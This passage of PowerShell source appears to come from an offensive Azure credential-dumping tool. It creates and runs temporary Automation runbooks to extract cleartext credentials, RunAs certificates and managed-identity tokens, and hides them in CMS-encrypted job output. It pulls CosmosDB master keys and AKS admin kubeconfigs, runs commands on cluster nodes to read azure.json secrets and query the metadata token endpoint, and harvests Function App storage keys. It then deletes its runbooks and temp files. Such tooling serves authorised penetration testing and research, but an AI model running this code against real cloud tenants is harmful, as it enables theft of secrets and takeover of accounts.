                        "`$encryptedOut1 = (`$userName | Protect-CmsMessage -To cn=microburst)" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                        "`$encryptedOut2 = (`$password | Protect-CmsMessage -To cn=microburst)" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append

                        # Write the output to the log
                        "write-output `$encryptedOut1" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                        "write-output `$encryptedOut2" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append

                        $jobList2 += @($jobName2)
                    }
                }
            
                #Assume there's no MI
                $dumpMI = $false
                #Need to fetch via the REST endpoint to check if there's an identity
                $AccessToken = Get-AzAccessToken -ResourceUrl "https://management.azure.com/"
                if ($AccessToken.Token -is [System.Security.SecureString]) {
                    $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($AccessToken.Token)
                    try {
                        $mgmtToken = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
                    } finally {
                        [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
                    }
                } else {
                    $mgmtToken = $AccessToken.Token
                }
                $accountDetails = (Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "?api-version=2015-10-31")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json
                if($accountDetails.identity.type -match "systemassigned"){
                
                    $dumpMI = $true
                    $dumpMiJobName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
                    # Copy the B64 encryption cert to the Automation Account host
                    "New-Item -ItemType Directory -Force -Path `"C:\Temp`" | Out-Null" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1"
                    "`$FileName = `"C:\Temp\microburst.cer`"" | Out-File -Append -FilePath "$pwd\$dumpMiJobName.ps1"
                    "[IO.File]::WriteAllBytes(`$FileName, [Convert]::FromBase64String(`"$ENCbase64string`"))" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                    "Import-Certificate -FilePath `"c:\Temp\microburst.cer`" -CertStoreLocation `"Cert:\CurrentUser\My`" | Out-Null" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                    #Request a token from the IMDS
                    "`$resource= `"?resource=https://management.azure.com/`"" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                    "`$url = `$env:IDENTITY_ENDPOINT + `$resource " | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                    "`$Headers = New-Object `"System.Collections.Generic.Dictionary[[String],[String]]`" " | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                    "`$Headers.Add(`"X-IDENTITY-HEADER`", `$env:IDENTITY_HEADER) " | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                    "`$Headers.Add(`"Metadata`", `"True`") " | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                    "`$accessToken = Invoke-RestMethod -Uri `$url -Method 'GET' -Headers `$Headers" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                    # Encrypt the token in the Automation account output
                    "`$encryptedOut1 = (`$accessToken.access_token | Protect-CmsMessage -To cn=microburst)" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                    # Remove the encryption cert
                    "Get-Childitem -Path Cert:\CurrentUser\My -DocumentEncryptionCert -DnsName microburst | Remove-Item" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                    "write-output `$encryptedOut1" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                
               
                }                             

    #============================== End Automation Script Creation ==============================#

    #============================ Start Automation Script Execution =============================#
                # No creds handle
                if (($autoCred -eq $null) -and ($jobList -eq $null)){Write-Verbose "`tNo Connections or Credentials configured for $verboseName Automation Account"}

                # If there's no connection jobs, don't run any
                if ($jobList.Count -ne $null){
                    $connectionIter = 0
                    while ($connectionIter -lt ($jobList.Count)){
                        $jobName = $jobList[$connectionIter]
                        $runAsName = $jobList[$connectionIter+1]

                        Write-Verbose "`tGetting the RunAs certificate for $verboseName using the $jobName.ps1 Runbook"
                        try{
                            Import-AzAutomationRunbook -Path $pwd\$jobName.ps1 -ResourceGroup $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $jobName | Out-Null

                            try{
                                if($TestPane -eq "Y"){
                                    #For test pane execution we need to avoid the call to Publish-AzAutomationRunbook since the runbook needs to be a draft
                                    $AccessToken = Get-AzAccessToken
                                    if ($AccessToken.Token -is [System.Security.SecureString]) {
                                        $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($AccessToken.Token)
                                        try {
                                            $mgmtToken = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
                                        } finally {
                                            [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
                                        }
                                    } else {
                                        $mgmtToken = $AccessToken.Token
                                    }
                                    #Hit the /draft/testJob endpoint directly to create the job, poll for it to finish, and get the output
                                    $createJob = (Invoke-WebRequest -Verbose:$false -Method PUT -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $jobName,"/draft/testJob?api-version=2015-10-31")) -Headers @{Authorization="Bearer $mgmtToken"} -ContentType application/json -Body "{'runOn':''}").Content | ConvertFrom-Json
                                    $jobStatus = (Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $jobName,"/draft/testJob?api-version=2019-06-01")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json
                                    while($jobStatus.Status -ne "Completed"){
                                        $jobStatus = (Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $jobName,"/draft/testJob?api-version=2019-06-01")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json
                                    }
                                    $jobOutput = ((Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $jobName,"/draft/testJob/streams?api-version=2019-06-01")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json).Value
                                    $jobSummary = $jobOutput.properties.summary
                                    $FileName = Join-Path $pwd $runAsName"-AzureRunAsCertificate.pfx"
                                    [IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String(($jobSummary | Unprotect-CmsMessage -IncludeContext)))
                                    $instructionsMSG = "`t`t`tRun AuthenticateAs-$runAsName.ps1 (as a local admin) to import the cert and login as the Automation Connection account"
                                    Write-Verbose $instructionsMSG
                                }
                                else{
                                    # Publish the runbook
                                    Publish-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $jobName | Out-Null

                                    # Run the runbook and get the job id
                                    $jobID = Start-AzAutomationRunbook -Name $jobName -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId

                                    $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status

                                    # Wait for the job to complete
                                    Write-Verbose "`t`tWaiting for the automation job to complete"
                                    while($jobstatus.Status -ne "Completed"){
                                        $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
                                    }    
    
                                    $jobOutput = Get-AzAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | Get-AzAutomationJobOutputRecord | Select-Object -ExpandProperty Value
                          
                                    # if execution errors, delete the AuthenticateAs- ps1 file
                                    if($jobOutput.Exception){
                                        Write-Verbose "`t`tNo available certificate for the connection"
                                        Remove-Item -Path (Join-Path $pwd "AuthenticateAs-$runAsName.ps1") | Out-Null                            
                                    }
                                    # Else write it to a local file
                                    else{

                                        $FileName = Join-Path $pwd $runAsName"-AzureRunAsCertificate.pfx"
                                        # Decrypt the output and write the pfx file
                                        [IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String(($jobOutput.Values | Unprotect-CmsMessage)))

                                        $instructionsMSG = "`t`t`tRun AuthenticateAs-$runAsName.ps1 (as a local admin) to import the cert and login as the Automation Connection account"
                                        Write-Verbose $instructionsMSG                        
                                    }
                                }
                            
                            }
                            catch{}

                            # clean up
                            Write-Verbose "`t`tRemoving $jobName runbook from $verboseName Automation Account"
                            Remove-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -Name $jobName -ResourceGroupName $AutoAccount.ResourceGroupName -Force
                        }
                        Catch{Write-Verbose "`tUser does not have permissions to import Runbook"}

                        # Clean up local temp files
                        Remove-Item -Path $pwd\$jobName.ps1 | Out-Null

                        $connectionIter += 2
                    }
                }
            
                # If there's cleartext credentials, run the second runbook
                if ($autoCred -ne $null){
                    $autoCredIter = 0   
                    Write-Verbose "`tGetting cleartext credentials for the $verboseName Automation Account"
                    foreach ($jobToRun in $jobList2){
                        # If the additional runbooks didn't write, don't run them
                        if (Test-Path $pwd\$jobToRun.ps1 -PathType Leaf){
                            if($autoCred.Count -gt 1){
                                $autoCredCurrent = $autoCred[$autoCredIter]
                            }
                            else{$autoCredCurrent = $autoCred}

                            Write-Verbose "`t`tGetting cleartext credentials for $autoCredCurrent using the $jobToRun.ps1 Runbook"
                            $autoCredIter++
                            try{
                                Import-AzAutomationRunbook -Path $pwd\$jobToRun.ps1 -ResourceGroup $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $jobToRun | Out-Null

                                try{
                                    if($TestPane -eq "Y"){
                                        $AccessToken = Get-AzAccessToken
                                        if ($AccessToken.Token -is [System.Security.SecureString]) {
                                            $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($AccessToken.Token)
                                            try {
                                                $mgmtToken = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
                                            } finally {
                                                [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
                                            }
                                        } else {
                                            $mgmtToken = $AccessToken.Token
                                        }
                                        $createJob = (Invoke-WebRequest -Verbose:$false -Method PUT -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $jobToRun,"/draft/testJob?api-version=2015-10-31")) -Headers @{Authorization="Bearer $mgmtToken"} -ContentType application/json -Body "{'runOn':''}").Content | ConvertFrom-Json
                                        $jobStatus = (Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $jobToRun,"/draft/testJob?api-version=2019-06-01")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json
                                        while($jobStatus.Status -ne "Completed"){
                                            $jobStatus = (Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $jobToRun,"/draft/testJob?api-version=2019-06-01")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json
                                        }
                                        $jobOutput = ((Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $jobToRun,"/draft/testJob/streams?api-version=2019-06-01")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json).Value
                                        $jobSummary = $jobOutput.properties.summary
                                        $cred1 = ($jobSummary.Item(0) | Unprotect-CmsMessage)
                                        $cred2 = ($jobSummary.Item(1) | Unprotect-CmsMessage)
                                        $TempTblCreds.Rows.Add("Azure Automation Account",$AutoAccount.AutomationAccountName,$cred1,$cred2,"N/A","N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
                                    }
                                    else{
                                         # publish the runbook
                                        Publish-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $jobToRun | Out-Null

                                        # run the runbook and get the job id
                                        $jobID = Start-AzAutomationRunbook -Name $jobToRun -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId

                                        $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status

                                        # Wait for the job to complete
                                        Write-Verbose "`t`t`tWaiting for the automation job to complete"
                                        while($jobstatus.Status -ne "Completed"){
                                            $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
                                        }    
    
                                        # If there was an actual cred here, get the output and add it to the table                    
                                        try{
                                            # Get the output
                                            $jobOutput = (Get-AzAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | Get-AzAutomationJobOutputRecord | Select-Object -ExpandProperty Value)
                                
                                            # Might be able to delete this line...
                                            if($jobOutput[0] -like "Credentials asset not found*"){$jobOutput[0] = "Not Created"; $jobOutput[1] = "Not Created"}

                                            # Select only lines containing the protected content (skip eventual debug output)
                                            $jobOutput = $jobOutput | Where-Object { $_.value -match "-----BEGIN CMS-----" }
        
                                            # Decrypt the output and add it to the table
                                            $cred1 = ($jobOutput[0].value | Unprotect-CmsMessage)
                                            $cred2 = ($jobOutput[1].value | Unprotect-CmsMessage)
                                            $TempTblCreds.Rows.Add("Azure Automation Account",$AutoAccount.AutomationAccountName,$cred1,$cred2,"N/A","N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
                                        }
                                        catch {}
                                    }
                                
                                }
                                catch{}
                                Write-Verbose "`t`t`tRemoving $jobToRun runbook from $verboseName Automation Account"
                                Remove-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -Name $jobToRun -ResourceGroupName $AutoAccount.ResourceGroupName -Force

                            }
                            Catch{
                            Write-Verbose "`tUser does not have permissions to import Runbook"}

                            # Clean up local temp files
                            Remove-Item -Path $pwd\$jobToRun.ps1 | Out-Null
                        }
                    }
                }

                #If there's an identity then dump it
                if($dumpMi -eq $true){
                    Write-Verbose "`tGetting a token for the $verboseName Automation Account using the $dumpMiJobName.ps1 runbook"
                    try{
                        Import-AzAutomationRunbook -Path ".\$dumpMiJobName.ps1" -ResourceGroup $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $dumpMiJobName | Out-Null
                    
                        try{
                            if($TestPane -eq "Y"){
                                $AccessToken = Get-AzAccessToken
                                if ($AccessToken.Token -is [System.Security.SecureString]) {
                                    $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($AccessToken.Token)
                                    try {
                                        $mgmtToken = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
                                    } finally {
                                        [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
                                    }
                                } else {
                                    $mgmtToken = $AccessToken.Token
                                }
                                $createJob = (Invoke-WebRequest -Verbose:$false -Method PUT -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $dumpMiJobName,"/draft/testJob?api-version=2015-10-31")) -Headers @{Authorization="Bearer $mgmtToken"} -ContentType application/json -Body "{'runOn':''}").Content | ConvertFrom-Json
                                $jobStatus = (Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $dumpMiJobName,"/draft/testJob?api-version=2019-06-01")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json
                                while($jobStatus.Status -ne "Completed"){
                                    $jobStatus = (Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $dumpMiJobName,"/draft/testJob?api-version=2019-06-01")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json
                                }
                                $jobOutput = ((Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $dumpMiJobName,"/draft/testJob/streams?api-version=2019-06-01")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json).Value
                                $jobSummary = $jobOutput.properties.summary
                                Write-Verbose "`t`t`tRetrieved system assigned identity token for the $verboseName account"
                                $tokenDecrypted = $jobSummary | Unprotect-CmsMessage
                                # Add creds to the table
                                $TempTblCreds.Rows.Add("Automation Account System Assigned Managed Identity",$AutoAccount.AutomationAccountName,"N/A",$tokenDecrypted,"N/A","N/A","N/A","N/A","Token","N/A",$subName) | Out-Null
                            }
                            else{
                                Publish-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $dumpMiJobName | Out-Null
    
                                $jobID = Start-AzAutomationRunbook -Name $dumpMiJobName -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId
                                $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
                                # Wait for the job to complete
                                Write-Verbose "`t`tWaiting for the automation job to complete"
                                while($jobstatus.Status -ne "Completed"){
                                $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
                                }    
                                try{
                                    $jobOutput = Get-AzAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | Get-AzAutomationJobOutputRecord | Select-Object -ExpandProperty Value
                                    Write-Verbose "`t`t`tRetrieved system assigned identity token for the $verboseName account"
                                    $tokenDecrypted = $jobOutput.Values | Unprotect-CmsMessage
                                    # Add creds to the table
                                    $TempTblCreds.Rows.Add("Automation Account System Assigned Managed Identity",$AutoAccount.AutomationAccountName,"N/A",$tokenDecrypted,"N/A","N/A","N/A","N/A","Token","N/A",$subName) | Out-Null
                                }
                                catch{}
                            }
                        
                        }
                        catch{}

                        #clean up
                        Write-Verbose "`t`tRemoving $dumpMiJobName runbook from $verboseName AutomationAccount"
                        Remove-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -Name $dumpMiJobName -ResourceGroupName $AutoAccount.ResourceGroupName -Force
                    }
                    catch{Write-Verbose "`tUser does not have permissions to import Runbook"}

                    # Clean up local temp files
                    Remove-Item -Path $pwd\$dumpMiJobName.ps1 | Out-Null
                }


        
        }

            # Remove the encryption cert from the system
            Remove-Item .\microburst.cer
            Get-Childitem -Path Cert:\CurrentUser\My -DocumentEncryptionCert -DnsName microburst | Remove-Item
        }
    }
    
    if ($CosmosDB -eq 'Y'){
        # Cosmos DB Section

        Write-Verbose "Getting List of Azure CosmosDB Accounts..."

        # Pipe all of the Resource Groups into Get-AzCosmosDBAccount
        Get-AzResourceGroup | foreach-object {
        
            $cosmosDBaccounts = Get-AzCosmosDBAccount -ResourceGroupName $_.ResourceGroupName
            
            $currentRG = $_.ResourceGroupName

            # Go through each account and pull the keys
            $cosmosDBaccounts | ForEach-Object {
                $currentDB = $_.Name
                Write-Verbose "`tGetting the Keys for the $currentDB CosmosDB account"
                $cDBkeys = Get-AzCosmosDBAccountKey -ResourceGroupName $currentRG -Name $_.Name
                $TempTblCreds.Rows.Add("Azure CosmosDB Account",-join($currentDB,"-PrimaryReadonlyMasterKey"),"N/A",$cDBkeys.PrimaryReadonlyMasterKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
                $TempTblCreds.Rows.Add("Azure CosmosDB Account",-join($currentDB,"-SecondaryReadonlyMasterKey"),"N/A",$cDBkeys.SecondaryReadonlyMasterKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
                $TempTblCreds.Rows.Add("Azure CosmosDB Account",-join($currentDB,"-PrimaryMasterKey"),"N/A",$cDBkeys.PrimaryMasterKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
                $TempTblCreds.Rows.Add("Azure CosmosDB Account",-join($currentDB,"-SecondaryMasterKey"),"N/A",$cDBkeys.SecondaryMasterKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null                
            }
        }
    }

    if ($AKS -eq 'Y'){
        # AKS Cluster Section
         Write-Verbose "Getting List of Azure Kubernetes Service Clusters..."
         
        $SubscriptionId = ((Get-AzContext).Subscription).Id

        # Get a list of Clusters
        $clusters = Get-AzAksCluster

        # Get a token for the API
        $AccessToken = Get-AzAccessToken
        if ($AccessToken.Token -is [System.Security.SecureString]) {
            $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($AccessToken.Token)
            try {
                $bearerToken = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
            } finally {
                [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
            }
        } else {
            $bearerToken = $AccessToken.Token
        }

        $clusters | ForEach-Object{
            $clusterID = $_.Id
            $currentCluster = $_.Name

            Write-Verbose "`tGetting the clusterAdmin kubeconfig files for the $currentCluster AKS Cluster"
            # For each cluster, get the admin creds
            $clusterAdminCreds = ((Invoke-WebRequest -Uri (-join ('https://management.azure.com',$clusterID,'/listClusterAdminCredential?api-version=2021-05-01')) -Verbose:$false -Method POST -Headers @{ Authorization ="Bearer $bearerToken"} -UseBasicParsing).Content)
            $clusterAdminCredFile = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((($clusterAdminCreds | ConvertFrom-Json).kubeConfigs).value))

            # Add creds to the table
            $TempTblCreds.Rows.Add("AKS Cluster Admin ",$currentCluster,"clusterAdmin",$clusterAdminCredFile,"N/A","N/A","N/A","N/A","Kubeconfig-File","N/A",$subName) | Out-Null

            Write-Verbose "`tGetting the clusterUser kubeconfig files for the $currentCluster AKS Cluster"
            # For each cluster, get the user creds
            $clusterUserCreds = ((Invoke-WebRequest -Uri (-join ('https://management.azure.com',$clusterID,'/listClusterUserCredential?api-version=2021-05-01')) -Verbose:$false -Method POST -Headers @{ Authorization ="Bearer $bearerToken"} -UseBasicParsing).Content)
            $clusterUserCredFile = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((($clusterUserCreds | ConvertFrom-Json).kubeConfigs).value))
            
            # Add creds to the table
            $TempTblCreds.Rows.Add("AKS Cluster User ",$currentCluster,"clusterUser",$clusterUserCredFile,"N/A","N/A","N/A","N/A","Kubeconfig-File","N/A",$subName) | Out-Null

            if($ExportKube -eq 'Y'){
                $clusterAdminCredFile | Out-File -FilePath (-join('.\',$currentCluster,'-clusterAdmin.kubeconfig'))
                $clusterUserCredFile | Out-File -FilePath (-join('.\',$currentCluster,'-clusterUser.kubeconfig'))
            }

            # Cluster Configuration File Retrieval
            $nodeRG = $_.NodeResourceGroup
            $nodeVMSS = (Get-AzResource -ResourceGroupName $nodeRG | where ResourceType -EQ "Microsoft.Compute/virtualMachineScaleSets").Name

            if($_.Identity -eq $null){

                Write-Verbose "`tGetting the cluster service principal credentials from the $currentCluster AKS Cluster"
                
                # Assumes Linux Clusters
                "cat /etc/kubernetes/azure.json" | Out-File ".\tempscript"
            
                # Run command on the VMSS cluster            
                $commandOut = (Invoke-AzVmssVMRunCommand -ResourceGroupName $nodeRG -VMScaleSetName $nodeVMSS -InstanceId 0 -ScriptPath ".\tempscript" -CommandId RunShellScript)

                # Write to file to correct the "ucs-2 le bom" encoding on the command output
                $commandOut.Value[0].Message | Out-File ".\spTempFile" -Encoding utf8
                $utf8String = gc ".\spTempFile"

                # Convert azure.json file to JSON object
                $jsonSP = $utf8String[2..(($utf8String.Length)-4)] | ConvertFrom-Json

                # Cast IDs and Secret to table variables
                $tenantId = (-join("Tenant ID: ",$jsonSP.tenantId))
                $aadClientId = (-join("Client ID: ",$jsonSP.aadClientId))
                $aadClientSecret = (-join("Client Secret: ",$jsonSP.aadClientSecret))

                # Add creds to the table
                $TempTblCreds.Rows.Add("AKS Cluster Service Principal ",$currentCluster,$aadClientId,$aadClientSecret,$tenantId,"N/A","N/A","N/A","AKS-ServicePrincipal","N/A",$subName) | Out-Null
            
                # Delete Temp Files
                del ".\spTempFile"
                del ".\tempscript"
            }
            else{
                Write-Verbose "`tGetting the Managed Identity Token from the $currentCluster AKS Cluster"

                # Assumes Linux Clusters
                "curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:'true'" | Out-File ".\tempscript2"
            
                # Run command on the VMSS cluster            
                $commandOut = (Invoke-AzVmssVMRunCommand -ResourceGroupName $nodeRG -VMScaleSetName $nodeVMSS -InstanceId 0 -ScriptPath ".\tempscript2" -CommandId RunShellScript)

                # Write to file to correct the "ucs-2 le bom" encoding on the command output
                $commandOut.Value[0].Message | Out-File ".\spTempFile2" -Encoding utf8
                $utf8String = gc ".\spTempFile2"

                # Convert commandOutput file to JSON object
                $jsonSP = $utf8String[2..(($utf8String.Length)-8)] | ConvertFrom-Json

                # Cast IDs and Secret to table variables
                $accessToken = (-join("Access Token: ",$jsonSP.access_token))
                $clientID = (-join("Client ID: ",$jsonSP.client_id))

                # Add creds to the table
                $TempTblCreds.Rows.Add("AKS Cluster Service Principal ",$currentCluster,$clientID,$accessToken,"N/A","N/A","N/A","N/A","AKS-ManagedIdentity","N/A",$subName) | Out-Null
            
                # Delete Temp Files
                del ".\spTempFile2"
                del ".\tempscript2"

            }

        }

    }

    if ($FunctionApps -eq 'Y'){
        # Function Apps Section
        Write-Verbose "Getting List of Azure Function Apps..."
        $functApps = Get-AzFunctionApp
        
        if($functApps -ne $null){
            $functApps | ForEach-Object {
                
                $functAppName = $_.Name

                Write-Verbose "`tGetting Function keys and App Settings from the $functAppName application"
                # Extract Storage Account Key
                if($_.ApplicationSettings.WEBSITE_CONTENTAZUREFILECONNECTIONSTRING -ne $null){
                    $appSettings = ($_.ApplicationSettings.WEBSITE_CONTENTAZUREFILECONNECTIONSTRING).Split(";")
                    $TempTblCreds.Rows.Add("Function App Content Storage Account",$_.Name,($appSettings[1]).Trim("AccountName="),($appSettings[2]).Trim("AccountKey="),"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
                }

                # Extract Job Storage Keys
                if($_.ApplicationSettings.AzureWebJobsStorage -ne $null){
                    $appSettings = ($_.ApplicationSettings.AzureWebJobsStorage).Split(";")
                    $TempTblCreds.Rows.Add("Function App Job Storage Account",$_.Name,($appSettings[1]).Trim("AccountName="),($appSettings[2]).Trim("AccountKey="),"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
                }

                # Extract Service Principal
                if($_.ApplicationSettings.MICROSOFT_PROVIDER_AUTHENTICATION_SECRET -ne $null){
                    $appSettings = ($_.ApplicationSettings.MICROSOFT_PROVIDER_AUTHENTICATION_SECRET)

                    # Use APIs to grab Client ID
                    $AccessToken = Get-AzAccessToken -ResourceUrl "https://management.azure.com/"
                    if ($AccessToken.Token -is [System.Security.SecureString]) {
                        $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($AccessToken.Token)
                        try {
                            $mgmtToken = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
                        } finally {
                            [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
                        }
                    } else {
                        $mgmtToken = $AccessToken.Token
                    }
                    $subID = (get-azcontext).Subscription.Id
